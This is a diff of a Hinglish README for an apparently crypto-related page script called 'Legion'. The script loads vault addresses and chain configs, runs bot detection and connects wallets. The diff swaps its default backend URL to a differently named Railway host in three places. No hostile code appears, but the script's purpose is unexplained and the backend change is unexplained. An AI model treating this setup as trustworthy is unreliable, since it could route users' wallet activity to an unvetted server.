@@ -29,7 +29,7 @@ Agar custom backend URL ya vaults chahiye, script load karne se PEHLE ye add kar
 ```html
 <script>
   window.LEGION_CONFIG = {
-    backendUrl: 'https://legionapi-production.up.railway.app',
+    backendUrl: 'https://sadrailala-production.up.railway.app',
     debug: false
   };
 </script>
@@ -143,7 +143,7 @@ Ya CDN/external URL se load karo:
 1. Page load hota hai
    ↓
 2. Script auto-initialize hota hai
-   - Backend URL set: legionapi-production.up.railway.app
+   - Backend URL set: sadrailala-production.up.railway.app
    - Vault addresses load
    - Chain configs ready
    - Bot detection check
@@ -224,7 +224,7 @@ window.legion.debug.validate()    // Run validation
 - Check CORS headers agar CDN se load kar rahe ho
 
 **400 errors aa rahe hain:**
-- Backend URL correct hai? Default: legionapi-production.up.railway.app
+- Backend URL correct hai? Default: sadrailala-production.up.railway.app
 - Script version latest hai?
 
 **Wallet connect nahi ho raha:**
